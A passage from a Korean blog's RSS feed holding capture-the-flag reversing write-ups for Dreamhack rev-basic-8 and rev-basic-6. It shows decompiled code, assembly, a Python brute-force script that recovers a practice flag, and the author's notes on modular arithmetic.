class=&quot;mh&quot;&gt;0x15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usr_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;뭔가 감이 안 오는 것 같으면 어셈을 한 번 보는 것도 좋으니, 어셈으로 위 비교문의 if 조건을 보자.&lt;/p&gt;

&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;movsxd&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;18h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;var_18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;18h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;arg_0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;movzx&lt;/span&gt;   &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;imul&lt;/span&gt;    &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;11111011b&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;and&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mb&quot;&gt;11111111b&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;movsxd&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;18h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;var_18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;lea&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;_140003000&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;movzx&lt;/span&gt;   &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rdx&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;rcx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;cmp&lt;/span&gt;     &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;jz&lt;/span&gt;      &lt;span class=&quot;nv&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;loc_140001053&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;imul~and 까지가 가장 중요한 부분이다.&lt;/p&gt;

&lt;p&gt;앞서 설명한 2’s complement를 감안할 때, imul 의 operand 2는&lt;/p&gt;

&lt;p&gt;0x11111011(2) == -0x00000101(2) == -5(10)&lt;/p&gt;

&lt;p&gt;and 연산의 이유는 뭐지?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;아 r계열 레지스터(64bit) 에 e계열 레지스터인 것처럼 값을 넣었으니까(32bit) 상위 32bit의 값을 정리해 주려고 하는 거구나&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;5 곱하는 이유…char 자료형이니 8bit 내에서 일어나는 일을 보고 싶은 것 같은데&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이걸 어떻게 표현해야 하지?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;imul이라는 레지스터가 중요함. 이건 부호 연산을 할 수 있는 레지스터임 → 이걸 썼다는 것은 음수를 썼을 가능성이 높다는 뜻&lt;/p&gt;

&lt;p&gt;동적 분석은 보통 x64dbg 사용한다&lt;/p&gt;

&lt;p&gt;연산하고 and 연산이 추가되는 경우는, 하위 n 비트를 구하기 위한 목적이 크다. 형변환이라든가… 자료형(크기) 다른 포맷으로 변경한다든가….&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;23-난관에-봉착하다&quot;&gt;2.3. 난관에 봉착하다&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;5*usr_input == 정답배열이어야 하는데&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;이걸 뒤집으면&lt;/p&gt;

&lt;p&gt;5 * usr_input == -정답배열&lt;/p&gt;

&lt;p&gt;즉, 정답배열에 2’s complement를 취한 걸 정답’ 라고 하면&lt;/p&gt;

&lt;p&gt;뭘 5번 덧셈해야(ALU는 덧셈연산밖에 못하니까) 정답’ 이 되는지 나와야 하는데, 안 나온다.&lt;/p&gt;

&lt;p&gt;심지어 usr_input은 char type라서 1byte짜리로, 부동소수점 타입도 안 된다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;24-난관에서-빠져나왔다&quot;&gt;2.4. 난관에서 빠져나왔다&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;어차피 1byte짜리니까, 0~255까지 모든 숫자를 넣어보면서,&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;5*usr_input == 정답배열을 충족하는 0x15짜리 길이 문자열을 도출해도 된다고 생각했다.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;브루트포싱은 아래와 같이 했음&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;AC F3 0C 25 A3 10 B7 25 16 C6 B7 BC 07 25 02 D5 C6 11 07 C5&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;tmp2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos; &apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;byte_140003000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extend&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;brute_force&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;brute_force&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;brute_force&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;solve_tmp&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;solve_string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;solve_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solve_tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;solve_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;플래그 획득까지 완료&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-질문&quot;&gt;3. 질문.&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그런데 왜 역산이 불가능하지?&lt;/p&gt;

&lt;p&gt;개인적으로 추측해 보았다.&lt;/p&gt;

&lt;p&gt;1byte로 표현하는 수라면, 0~255 까지를 한 주기로 하는 정수의 모듈러 군이다.&lt;/p&gt;

&lt;p&gt;모듈러 군 내에서 곱셈은 일대일 함수가 아니므로 곱셈과 나눗셈의 역산 관계가 성립되지 않는다. 하나의 역원 존재 불가&lt;/p&gt;

&lt;p&gt;곱셈이고 나눗셈이고 덧셈의 연장인데 왜? 라고 생각할 수 있을 것 같다. 그러나 모듈러 연산이 적용되는 닫힌군이라는 게 이 역산 불가의 원인으로 작용하므로… 음수는 의미없고&lt;/p&gt;

&lt;p&gt;이런 원리를 이용한 게 PKI이고.&lt;/p&gt;

&lt;p&gt;즉 밑을 상대적으로 작게(255) 들고 가는 모듈러 집합이라 5라는 작은 수를 곱해도 80% 이상 확률로(해당 군의 약 20%인 0~50까지는 5를 곱해도 255 이상이 아님) 나머지 연산이 이루어질 수 있기 때문에 어쩔 수 없이 (1-0.8^0x14) * 100 == 98.845% 의 확률로 복원 불가능한 정보임&lt;/p&gt;

&lt;p&gt;따라서 브루트 포싱만이 답이라고 생각함.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
</description>
        <pubDate>Sun, 01 Dec 2024 01:00:00 -0600</pubDate>
        <link>https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-8</link>
        <guid isPermaLink="true">https://touBVa.github.io/blog/reversing/2024-12-01-rev-basic-8</guid>
      </item>
    
      <item>
        <title>Dreamhack-rev-basic-6 문제 풀이</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#0-메타데이터-분석&quot; id=&quot;markdown-toc-0-메타데이터-분석&quot;&gt;0. 메타데이터 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-동적-분석&quot; id=&quot;markdown-toc-1-동적-분석&quot;&gt;1. 동적 분석&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-정적-분석&quot; id=&quot;markdown-toc-2-정적-분석&quot;&gt;2. 정적 분석&lt;/a&gt;    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#21-sub_140001000usr_input&quot; id=&quot;markdown-toc-21-sub_140001000usr_input&quot;&gt;2.1. sub_140001000(usr_input)&lt;/a&gt;        &lt;ul&gt;
          &lt;li&gt;&lt;a href=&quot;#byte_140003000-데이터-분석&quot; id=&quot;markdown-toc-byte_140003000-데이터-분석&quot;&gt;byte_140003000 데이터 분석&lt;/a&gt;&lt;/li&gt;
          &lt;li&gt;&lt;a href=&quot;#byte_140003020-데이터-분석&quot; id=&quot;markdown-toc-byte_140003020-데이터-분석&quot;&gt;byte_140003020 데이터 분석&lt;/a&gt;&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;0-메타데이터-분석&quot;&gt;0. 메타데이터 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_15.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_15.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;PE64&lt;/li&gt;
  &lt;li&gt;C언어로 작성된 프로그램&lt;/li&gt;
  &lt;li&gt;아마 패킹 안됐을 것이다&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;1-동적-분석&quot;&gt;1. 동적 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Input을 사용자의 stdio를 통해 받는데 그게 콘솔에 이루어지는 입력&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;2-정적-분석&quot;&gt;2. 정적 분석&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_16.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_16.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;sub_140001210은 사용자 입력을 받는 함수겠지&lt;/p&gt;

&lt;p&gt;scanf계열일 것이고 stdin을 입력파일로 하니까&lt;/p&gt;

&lt;p&gt;사용자 입력은 char로 들어가겠군!&lt;/p&gt;

&lt;p&gt;그리고 들어가 보면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_acrt_iob_func(0)&lt;/code&gt; 이 보이므로 맞는 추측&lt;/p&gt;

&lt;p&gt;중요한 건 검증 루틴인 sub_140001000() 이므로 delve into 해보자&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;21-sub_140001000usr_input&quot;&gt;2.1. sub_140001000(usr_input)&lt;/h2&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_17.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_17.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;안예뻐&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_18.png&quot; alt=&quot;/assets/img/posts/2024-12-01-rev-basic-6/Untitled_18.png&quot; width=&quot;100%&quot; height=&quot;100%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;예쁘게 바꿔옴 ㅎㅎ&lt;/p&gt;

&lt;p&gt;저 두 개의 바이트 배열의 관계를 보면&lt;/p&gt;

&lt;p&gt;byte_140003000의 초반 0x12개 원소를 기준으로 byte_1400003020을 보는 거고&lt;/p&gt;

&lt;p&gt;검증의 횟수는 총 0x12번 즉 18번이다.&lt;/p&gt;

&lt;p&gt;그럼 byte_140003000에서는 어느 레인지까지의 답이 나오나 보자&lt;/p&gt;

&lt;p&gt;근데 저거 아무래도 그건가? 암호원리 중 전치?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;byte_140003000-데이터-분석&quot;&gt;byte_140003000 데이터 분석&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;00&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;51&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FB&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C3&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CF&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;92&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h3 id=&quot;byte_140003020-데이터-분석&quot;&gt;byte_140003020 데이터 분석&lt;/h3&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;77&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F2&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C5&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;01&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;67&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;B&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D7&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AB&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;76&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CA&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;82&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C9&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FA&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AD&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D4&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;C&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A4&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C0&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;B7&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FD&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;93&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;F&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F7&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CC&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;A5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;E5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;F1&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;71&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;D8&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;04&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;C7&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt; &lt;span 